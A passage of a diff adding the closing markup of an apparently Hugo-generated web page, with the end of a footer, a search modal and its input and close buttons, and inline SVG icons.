+              <span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+</span>
+            </div>
+          </button>
+        </div>
+      
+    </div>
+  </div>
+  
+  
+</footer>
+<div
+  id="search-wrapper"
+  class="invisible fixed inset-0 z-50 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm sm:p-6 md:p-[10vh] lg:p-[12vh] dark:bg-neutral-900/50"
+  data-url="//localhost:1313/"
+>
+  <div
+    id="search-modal"
+    class="top-20 mx-auto flex min-h-0 w-full max-w-3xl flex-col rounded-md border border-neutral-200 bg-neutral shadow-lg dark:border-neutral-700 dark:bg-neutral-800"
+  >
+    <header class="relative z-10 flex flex-none items-center justify-between px-2">
+      <form class="flex min-w-0 flex-auto items-center">
+        <div class="flex h-8 w-8 items-center justify-center text-neutral-400">
+          <span class="icon relative inline-block px-1 align-text-bottom"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          class="mx-1 flex h-12 flex-auto appearance-none bg-transparent focus:outline-dotted focus:outline-2 focus:outline-transparent"
+          placeholder="Search"
+          tabindex="0"
+        />
+      </form>
+      <button
+        id="close-search-button"
+        class="flex h-8 w-8 items-center justify-center text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        title="Close (Esc)"
+      >
+        <span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+</span>
+      </button>
+    </header>
+    <section class="flex-auto overflow-auto px-2">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+
+    </div>
+  </body>
+</html>
